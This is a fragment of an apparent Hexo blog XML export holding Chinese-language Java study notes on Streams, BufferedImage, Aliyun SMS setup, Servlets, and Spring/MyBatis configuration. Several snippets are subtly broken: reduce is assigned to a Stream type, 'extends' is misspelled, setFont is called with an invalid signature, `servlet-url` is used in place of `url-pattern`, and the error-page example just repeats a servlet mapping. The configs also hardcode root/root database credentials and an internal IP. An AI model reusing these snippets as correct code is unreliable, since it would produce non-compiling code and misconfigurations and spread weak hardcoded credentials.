<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Stream&lt;Integer&gt; s2 = s1.reduce((acc, n) -&gt; acc + n); <span class="comment">// BinaryOperator</span></span><br><span class="line">Stream&lt;Integer&gt; s2 = s1.reduce(<span class="number">1000</span> <span class="comment">/* 初始值 */</span>, (sum, n) -&gt; sum + n); <span class="comment">// BinaryOperator</span></span><br></pre></td></tr></table></figure>

<p>其他方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sorted()</span><br><span class="line">distinct() <span class="comment">// 去重</span></span><br><span class="line">limit()</span><br><span class="line">skip()  <span class="comment">// 跳过前N个元素</span></span><br><span class="line">concat()</span><br><span class="line">flatMap() <span class="comment">// 扁平化</span></span><br><span class="line">parallel() <span class="comment">// 并行处理</span></span><br><span class="line"></span><br><span class="line">reduce()</span><br><span class="line">count()</span><br><span class="line">max()</span><br><span class="line">min()</span><br><span class="line">sum()</span><br><span class="line">average()</span><br><span class="line">allMatch()</span><br><span class="line">anyMatch()</span><br><span class="line"></span><br><span class="line">forEach()</span><br><span class="line">toArray() <span class="comment">// Array</span></span><br><span class="line">collect() <span class="comment">// List / Set</span></span><br></pre></td></tr></table></figure>

<h1 id="Hutool-工具包"><a href="#Hutool-工具包" class="headerlink" title="Hutool 工具包"></a>Hutool 工具包</h1>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Utils</title>
    <url>/2021/08/21/Java/JavaUtils/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h1><h2 id="内存中的图片"><a href="#内存中的图片" class="headerlink" title="内存中的图片"></a>内存中的图片</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BufferedImage</span> <span class="variable">bImage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedImage</span>(width, height, BufferedImage.TYPE_INT_RGB);</span><br><span class="line"><span class="type">Graphics2D</span> <span class="variable">g</span> <span class="operator">=</span> (Graphics2D)bImage.getGraphics();</span><br><span class="line">g.setColor(Color.BLACK);</span><br><span class="line">g.setFont(<span class="literal">null</span>, Font.BOLD, <span class="number">20</span>);</span><br><span class="line">g.drawString(<span class="string">&quot;123&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h1 id="短信业务"><a href="#短信业务" class="headerlink" title="短信业务"></a>短信业务</h1><p>阿里云短信业务：</p>
<ol>
<li>在阿里源平台创建用户组，用户</li>
<li>在用户组权限管理下添加权限 SMS</li>
<li>给用户设置编程访问</li>
<li>拿到 AccessKey</li>
<li>设置签名和模板</li>
<li>打开快速学习，找代码</li>
<li>安装SDK</li>
</ol>
<h1 id="POI-操作-Office"><a href="#POI-操作-Office" class="headerlink" title="POI 操作 Office"></a>POI 操作 Office</h1><h1 id="Netty"><a href="#Netty" class="headerlink" title="Netty"></a>Netty</h1>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Web</title>
    <url>/2021/08/21/Java/JavaWeb/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h1 id="JavaWeb"><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h1><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">servlet-api</span><br><span class="line">jsp-api</span><br></pre></td></tr></table></figure>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><ul>
<li>&#x2F;</li>
<li>module_a<ul>
<li>src<ul>
<li>main<ul>
<li>java<ul>
<li>com.author.project<ul>
<li>HelloClass.java</li>
</ul>
</li>
</ul>
</li>
<li>resources</li>
<li>webapp<ul>
<li>WEB-INF<ul>
<li>web.xml</li>
</ul>
</li>
<li>index.jsp</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>test<ul>
<li>java</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">X</span> entends HttpServlet &#123;</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>向JSP传递参数，可以用Session。</p>
<p>用户不可见的页面可以放到WEB-INF下。</p>
<h3 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h3><p>注册服务</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-url</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以使用注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;ActionServlet&quot;,urlPatterns = &quot;/action&quot;)</span></span><br></pre></td></tr></table></figure>

<p>错误页面</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 放到最后 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-url</span>&gt;</span><span class="tag">&lt;/<span class="name">servlet-url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>注册过滤器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CountFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.pjb.filter.CountFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 参数名 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>count<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 参数值 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>5000<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CountFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以使用注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter</span> (filterName= <span class="string">&quot;encodingFilter&quot;</span> ,urlPatterns= <span class="string">&quot;/*&quot;</span> , </span><br><span class="line">initParams = &#123; <span class="meta">@WebInitParam(name = &quot;count&quot;, value = &quot;5000&quot;)</span> &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化参数</span></span><br><span class="line"><span class="built_in">this</span>.getInitParameter();</span><br><span class="line"><span class="comment">// 配置</span></span><br><span class="line"><span class="built_in">this</span>.getServletConfig();</span><br><span class="line"><span class="comment">// 上下文，代表当前web应用</span></span><br><span class="line"><span class="built_in">this</span>.getServletContext();</span><br><span class="line"><span class="comment">// 功能：</span></span><br><span class="line"><span class="comment">//   1. Servlet 之间共享数据</span></span><br><span class="line">context.setAttribute(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">context.getAttribute(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"><span class="comment">//   2. 获取参数</span></span><br><span class="line">context.getInitParameter();</span><br><span class="line"><span class="comment">//   3. 转发 200 OK</span></span><br><span class="line">context.getRequestDispatcher().forward();</span><br><span class="line"><span class="comment">//   4. 读取资源文件  资源文件在 resources 下 db.properties</span></span><br><span class="line"><span class="type">Properties</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">prop.load(context.getResourceAsStream(<span class="string">&quot;/WEB-INF/classes/com/.../db.properties&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resp.setStatus(<span class="number">302</span>);</span><br><span class="line">resp.sendRedirect();</span><br></pre></td></tr></table></figure>

<h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取请求参数</span></span><br><span class="line">req.getParameter();</span><br><span class="line">req.getParameterValues();</span><br><span class="line"><span class="comment">// 转发请求</span></span><br><span class="line">req.getRequestDispatcher().forward();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring</title>
    <url>/2021/08/21/Java/Spring/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h1 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h1><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p><code>application-config.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">		http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">		http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">		http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;spring-dao.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>spring-dao.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">		http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">		http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">		http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--DataSource--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://10.112.218.78:3307/study?serverTimezone=UTC&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--SqlSessionFactory--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:mybatis-config.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- SqlSession --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSession&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionTemplate&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--结合AOP自动加入事务管理--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;txPointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* mapper.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;txPointCut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h2><p><code>db.properties</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jdbc.driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/sams?serverTimezone=UTC </span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=root</span><br></pre></td></tr></table></figure>

<p><code>mybatis-config.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 该配置影响的所有映射器中配置的缓存的全局开关。默认值true --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--延迟加载的全局开关。当开启时，所有关联对象都会延迟加载。 特定关联关系中可通过设置fetchType属性来覆盖该项的开关状态。默认值false  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 是否允许单一语句返回多结果集（需要兼容驱动）。 默认值true --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;multipleResultSetsEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 使用列标签代替列名。不同的驱动在这方面会有不同的表现， 具体可参考相关驱动文档或通过测试这两种不同的模式来观察所用驱动的结果。默认值true --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;useColumnLabel&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 允许 JDBC 支持自动生成主键，需要驱动兼容。 如果设置为 true 则这个设置强制使用自动生成主键，尽管一些驱动不能兼容但仍可正常工作（比如 Derby）。 默认值false  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;useGeneratedKeys&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  指定 MyBatis 应如何自动映射列到字段或属性。 NONE 表示取消自动映射；PARTIAL 只会自动映射没有定义嵌套结果集映射的结果集。 FULL 会自动映射任意复杂的结果集（无论是否嵌套）。 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 默认值PARTIAL --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;autoMappingBehavior&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PARTIAL&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;autoMappingUnknownColumnBehavior&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WARNING&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  配置默认的执行器。SIMPLE 就是普通的执行器；REUSE 执行器会重用预处理语句（prepared statements）； BATCH 执行器将重用语句并执行批量更新。默认SIMPLE  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultExecutorType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;SIMPLE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置超时时间，它决定驱动等待数据库响应的秒数。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultStatementTimeout&quot;</span> <span class="attr">value</span>=<span class="string">&quot;25&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultFetchSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 允许在嵌套语句中使用分页（RowBounds）默认值False --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;safeRowBoundsEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 是否开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN 到经典 Java 属性名 aColumn 的类似映射。  默认false --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- MyBatis 利用本地缓存机制（Local Cache）防止循环引用（circular references）和加速重复嵌套查询。</span></span><br><span class="line"><span class="comment">               默认值为 SESSION，这种情况下会缓存一个会话中执行的所有查询。</span></span><br><span class="line"><span class="comment">              若设置值为 STATEMENT，本地会话仅用在语句执行上，对相同 SqlSession 的不同调用将不会共享数据。  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;localCacheScope&quot;</span> <span class="attr">value</span>=<span class="string">&quot;SESSION&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 当没有为参数提供特定的 JDBC 类型时，为空值指定 JDBC 类型。 某些驱动需要指定列的 JDBC 类型，多数情况直接用一般类型即可，比如 NULL、VARCHAR 或 OTHER。  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;jdbcTypeForNull&quot;</span> <span class="attr">value</span>=<span class="string">&quot;OTHER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--   指定哪个对象的方法触发一次延迟加载。  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadTriggerMethods&quot;</span> <span class="attr">value</span>=<span class="string">&quot;equals,clone,hashCode,toString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--加载映射文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper/AdminMapper.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span 